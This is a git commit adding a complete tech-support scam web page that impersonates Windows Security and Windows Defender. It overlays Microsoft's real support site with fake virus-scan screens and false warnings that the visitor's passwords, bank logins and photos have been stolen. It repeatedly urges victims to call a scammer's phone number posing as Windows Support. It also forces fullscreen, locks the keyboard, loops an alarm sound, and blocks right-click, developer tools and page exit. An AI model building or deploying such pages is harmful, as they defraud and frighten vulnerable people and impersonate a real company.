2e61922643e65e48492a3ae6089d7eec817ece22
sp9564 <143349654+sp9564@users.noreply.github.com>
2023-08-28 00:00:30 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,564 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Windows Support Assistance Er02Df87</title>
+<link rel="stylesheet" href="styles.css">
+<script type="text/javascript" src="scripts.js"></script>
+<link rel="icon" type="image/png" sizes="32x32" href="def.png">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-JNCVPNG0V6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-JNCVPNG0V6');
+</script>
+
+<style>
+.black {
+  width: 100%;
+  height: 100%;
+  background-color: rgb(0 0 0 / 47%);
+  opacity: 0.7;
+  transition: 1s;
+  position: absolute;
+  top: -190px;
+  left:0
+}
+
+.btn-primary {
+          color: #fff;
+          background-color: #007bff;
+          border-color: #007bff;
+      }
+
+
+      .btn-lg {
+          padding: 0.5rem 1rem;
+          font-size: 1.25rem;
+          line-height: 1.5;
+          border-radius: 0.3rem;
+        }
+
+          .btn-secondary {
+        color: #fff;
+        background-color: #6c757d;
+        border-color: #6c757d;
+    }
+      #age-confirmation-modal{
+          position: fixed;
+          top: 0;
+          bottom: 0;
+          left: 0;
+          right: 0;
+          z-index: 999999999;
+          display: inline-block;
+          background-color: rgba(0, 0, 0, 1);
+          background-image: url('modal-bg.png');
+            width: 100%;
+          height: auto;
+          background-repeat: no-repeat;
+          text-align: center;
+          font-size: 3.5rem;
+      }
+      #age-confirmation-modal .innerContainer{
+          background-color: #fff;
+          color: #111111;
+          padding: 50px;
+            border-radius: 20px;
+          display: inline-block;
+          top: 50%;
+          position: absolute;
+          left: 50%;
+          transform: translate(-50%, -50%);
+      }
+
+      #other-content{
+          display: none;
+      }
+
+      .close {
+        float: right;
+    line-height: 1;
+    border: none;
+    text-shadow: none;
+    opacity: 1;
+    background: none;
+      }
+
+      .btn-secondary:not(:disabled):not(.disabled).active, .btn-secondary:not(:disabled):not(.disabled):active, .show>.btn-secondary.dropdown-toggle{
+          background-color: #007BFF;
+          border-color: #007BFF;
+          color: #fff;
+      }
+
+</style>
+
+
+
+<script>
+var elem = document.documentElement;
+function openFullscreen() {
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen();
+  } else if (elem.webkitRequestFullscreen) { /* Safari */
+    elem.webkitRequestFullscreen();
+  } else if (elem.msRequestFullscreen) { /* IE11 */
+    elem.msRequestFullscreen();
+  }
+}
+
+function closeFullscreen() {
+  if (document.exitFullscreen) {
+    document.exitFullscreen();
+  } else if (document.webkitExitFullscreen) { /* Safari */
+    document.webkitExitFullscreen();
+  } else if (document.msExitFullscreen) { /* IE11 */
+    document.msExitFullscreen();
+  }
+}
+</script>
+
+
+<script type="text/javascript">
+window.onbeforeunload = function() {
+   if (data_needs_saving()) {
+       return "Call Windows Defender Helpline Now";
+   } else {
+      return;
+   }
+};
+        </script>
+        <script type="text/javascript">
+            window.addEventListener("beforeunload", function (e) {
+         var confirmationMessage = 'It looks like you are editing something. '
+                            + 'Your changes will be lost if you leave before saving.';
+
+                (e || window.event).returnValue = confirmationMessage; //Gecko + IE
+                return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+            });
+        </script>
+
+</head>
+
+<body id="mycanvas" onclick="playSound()" >
+
+
+  
+
+<iframe src="https://support.microsoft.com" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
+</iframe>
+
+<a  onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
+    <div class="black" style="height: 145%;"></div>
+</a>
+
+<div class="box" id="box">
+<div class="top">
+<p style="font-size: 13px;  font-family: Arial, Helvetica, sans-serif;">Windows security<img src="minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
+</div>
+
+<h2 style="position: absolute; left: 70px; top: 60px; font-weight: 300;" id="text1">Safety at a glance</h2>
+<p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2"><br>Check what is happening to the safety and health of your device and take all necessary measures.</p>
+<div class="centerright">
+<ul>
+<li>
+<br>
+<img src="kxFy-clip.png" width="50px;">
+<p>Virus and threat protection</p>
+<p style="top: 120px; position: absolute; font-size: 13px; color: grey;">action is required. Run a scan to check for <br>threats.</p>
+
+</li>
+<li>
+<br><br>
+<img src="qsbs-firewall.png" width="60px;">
+<p>Firewall and network protection</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+</li>
+</ul>
+<ul>
+<li>
+<br>
+<img src="s-S4-acc.png" width="60px;">
+<p>Account protection</p>
+<p style="top: 125px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+</li>
+<li>
+<br>
+<img src="Z5BR-network.png" width="51px;"/>
+<p>Application and browser control</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+</li>
+</ul>
+</div>
+<img src="uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+<br>
+</div>
+
+<!--Windows Security Quick Scan-->
+<div class="scan" id="scan">
+  <div class="top">
+  <p style="font-size: 13px;  font-family: Arial, Helvetica, sans-serif;">Windows security<img src="minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
+  </div>
+  <h2 style="position: absolute; left: 70px; top: 60px; font-weight: 300;" id="text1"><img src="okPE-vs.png" width="25px;" style="margin-right: 10px;">Virus and threat protection</h2>
+  <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Device protection against threats.</p>
+
+<h3 style="position: absolute; right: 180px; top: -10px; font-weight: 300;" id="text12"><b>+1-888-612-0451 (Free Security)</b></h3>
+  <div class="centerright">
+
+
+  <ul>
+  <li>
+
+
+
+  <div class="flex"> <img src="-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 33px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">Current Threat</p></div>
+
+
+  <br><br>
+  <div class="progress" id="bar">
+    <div class="progress__bar"></div>
+  </div>
+
+  <p style="font-size: 13px;" id="info">A quick scan is in progress...<br>Estimated time remaining: <n id="time">0</b></n><br><n id="amount">0</b></n> Files scanned.</p>
+
+  <a href="#"class="button" id="re">to cancel</a>
+  <p style=" font-size: 13px;" id="recx">Keep working while we analyze your device.</p>
+
+  <p style="font-size: 13px; color: #0063c6; cursor: pointer;" id="recx-hide">protection history</p>
+  <br>
+  <p id="shx" style="font-size: 13px; color: #0063c6; display: none; cursor: pointer;">Scan Options<br> Allowed Threats<br> Protection History</p>
+
+
+  </li>
+
+  <li>
+
+<div class="flex"><img src="nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: 5px;"><p style="position: absolute; left: 35px;    bottom: 84px;    line-height: 18px;">Virus & threat protection settings </p> </div>
+<p style="color: grey; font-size: 13px;">no action required</p>
+<p style="font-size: 13px; color: #0063c6;">Manage your settings</p>
+  </li>
+  </ul>
+  <ul>
+
+  <li>
+
+
+  <p style="position: absolute; top: -55px;">I have a question?</p>
+
+  <p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px; cursor: pointer;">get help</p>
+
+  </li>
+  <li>
+
+
+    <p style="position: absolute; top: 25px;">who will protect me</p>
+
+    <p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px; cursor: pointer;">Supplier management</p>
+
+    </li>
+    <li>
+
+
+      <p style="position: absolute; top: 100px; "><br>Help us improve Windows security</p>
+
+      <p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px; cursor: pointer;">Send us your feedback</p>
+
+      </li>
+      <li>
+
+        <p style="position: absolute; top: 190px;">Change your privacy settings</p>
+        <p style="position: absolute; top: 220px; font-size: 13px;">View and change privacy settings on Windows<br><n id="which"></b></n> devices.</p>
+
+        <p style="font-size: 13px; color: #0063c6; position: absolute; top: 270px; cursor: pointer;">Privacy Settings<br>Privacy Dashboard<br>Privacy Statement</p>
+
+        </li>
+
+  </ul>
+
+  </div>
+  <img src="uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+  <br>
+  </div>
+  <script>
+          navigator.userAgentData.getHighEntropyValues(["platformVersion"])
+   .then(ua => {
+     if (navigator.userAgentData.platform === "Windows") {
+       const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+       if (majorPlatformVersion >= 13) {
+        document.getElementById("which").innerHTML = " 11";
+        }
+        else if (majorPlatformVersion > 0) {
+          document.getElementById("which").innerHTML = " 10";
+        }
+        else {
+          console.log("Beyond");
+        }
+     }
+     else {
+       console.log("does not work on Windows");
+     }
+   });
+  </script>
+
+
+
+
+
+
+<div class="alert_popup cardcontainer lightbox">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <p class="text-center" style="    font-size: 16px;
+font-weight: normal;
+margin: 0;
+margin-bottom: 5px;
+padding: 5px 10px;
+color: #fff;font-weight: bold;
+margin-top: 8px; text-align: center;">Windows Security - Spyware Alert</p>
+                <p class="text-center">** Access to this PC has been blocked for security reasons **</p>
+                <p>Your computer has been warned that it is infected with Trojan spyware. The following data was compromised: <br><br>
+                   > Email ID<br> &gt; Bank Password<br>
+                   > Facebook Login<br>
+                   > Photos and Photo Documents </p>
+
+                  <p>A Windows Security scan has detected potentially unwanted adware on this device that can steal passwords, online identities, financial information, personal files, images, or documents.</p>
+                  <p>Please contact us immediately so that our engineer can explain the removal process over the phone.<br><br>
+
+                  Please contact Windows Support immediately to report this threat, prevent spoofing, and unlock access to this device.<br><br>
+                  Closing this window puts your personal information at risk and interrupts your Windows registration.</p>
+
+               <p style="padding-bottom: 0px;">Call Windows Support <strong>+1-888-612-0451 (Security Toll-Free)</strong></p>
+               <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">OK</a> <a class="" id="leave_page">Cancel</a> </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+<audio id="beep" loop>
+  <source src="_Fm7-alert.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+  addEventListener("click", function() {
+var el = document.documentElement
+  , rfs =
+         el.requestFullScreen
+      || el.webkitRequestFullScreen
+      || el.mozRequestFullScreen
+;
+rfs.call(el);
+});
+
+</script>
+
+<div id="lst" class="lst lightbox">
+  <div class="ilb top">
+      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> Windows Defender Security Center</span>
+          <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>
+
+      </div>
+  </div>
+  <div id="txtintro">
+              <span class="colo-rd">App: Ads.financetrack(2).dll<br>
+              Threats Detected: Trojan Spyware</span>
+  </div>
+  <img id="banner" src="virus-images.jpeg">
+  <div id="disclaimer">
+  Access to this PC has been blocked for security reasons.<br>
+      <span class="support">Contact Windows Support: +1-888-612-0451 (Security Toll-Free)</span>
+      <br>
+      <small>Note: If you think this Notification is by error, report immediately to Windows Support to halt the auto-deletion of files and applications from this computer. As this Computer ID is flagged and is connected over the internet Servers, files and apps deletion may start any moment.</small>
+  </div>
+  <div id="bottom">
+      <img id="badge" src="def.png"><span class="title3">Windows Support</span>
+      <ul>
+          <li>
+              <a href="#">
+                  <div class="fr button2">
+                      <span id="addtochromebutton">Deny</span>
+                  </div>
+              </a>
+          </li>
+          <li>
+              <a href="#">
+                  <div class="fr buttons blink">
+                      <span id="addtochromebutton">Allow</span>
+                  </div>
+              </a>
+          </li>
+      </ul>
+
+  </div>
+</div>
+
+</div>
+
+<div id="footer">
+  <div class="row">
+
+      <div class="col-md-12">
+          <div class="right-foot" style="text-align: center;">
+              <span id="footertxt" style="font-weight: 700;"><img src="defender.png"> Windows </span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support Contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-888-612-0451 (Security Toll-Free)</span></span>
+          </div>
+      </div>
+      <div class="col-md-12">
+          <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">Windows
+                                                                        Defender SmartScreen prevented unrecognized apps from displaying. Running this app may put your PC
+                                                                        at risk. Windows Defender Scan has found unwanted adware that may steal on this device
+                                                                        passwords, online IDs, financial information, personal files, photos, or
+                                                                        document.</small></marquee>
+      </div>
+  </div>
+
+
+</div>
+
+<div id="welcomeDiv"
+     style=" display:none; background-color:#000; height: auto; width: 550px; margin-left:32%;position: absolute;z-index: 9999999999;text-align: center;
+     margin-top: -8px; "
+     class="answer_list">
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Do not reboot or use
+         Your computer.<br>Your computer is disabled. Please, call Windows Defender. <br>Access is the block security reason for this
+         Computer. <br>Please contact us immediately. A technician will help you solve the problem.</p>
+
+
+</div>
+
+<script>
+  $(document).ready(function () {
+      $("#mycanvas").click(function () {
+          $("#welcomeDiv").show();
+      });
+  });
+</script>
+
+
+
+<script type="text/javascript">
+  document.getElementById("age-confirmation-modal").onclick = function(){
+      document.getElementById("age-confirmation-modal").style.display = "none";
+      document.getElementById("other-content").style.display = "inline";
+
+    addEventListener("click", function() {
+      var
+            el = document.documentElement
+          , rfs =
+                 el.requestFullScreen
+              || el.webkitRequestFullScreen
+              || el.mozRequestFullScreen
+      ;
+      rfs.call(el);
+      });
+  }
+   $("a#thing_to_click").click(function(e){
+       e.preventDefault();
+       window.location = "#";
+  });
+
+  </script>
+
+<script>
+navigator.keyboard.lock();
+document.onkeydown = function (e) {
+return false;
+}
+</script>
+<script type="text/javascript">
+
+
+
+        // To disable right click
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+
+
+        // To disable F12 options
+
+        document.onkeypress = function (event) {
+
+            event = (event  window.event);
+
+            if (event.keyCode == 123) {
+
+                return false;
+
+            }
+
+        }
+
+        document.onmousedown = function (event) {
+
+            event = (event  window.event);
+
+            if (event.keyCode == 123) {
+
+                return false;
+
+            }
+
+        }
+
+        document.onkeydown = function (event) {
+
+            event = (event  window.event);
+
+            if (event.keyCode == 123) {
+
+                return false;
+
+            }
+
+        }
+
+
+
+        // To To Disable ctrl+c, ctrl+u
+
+
+
+        jQuery(document).ready(function ($) {
+
+            $(document).keydown(function (event) {
+
+                var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();
+
+
+
+                if (event.ctrlKey && (pressedKey == "c" || pressedKey == "u")) {
+
+                    alert('Sorry, this feature is disabled!');
+
+//disable key press porcessing
+
+                    return false;
+
+                }
+
+            });
+
+        });
+
+
+
+    </script>
+
+  </body>
+
+
+</html>
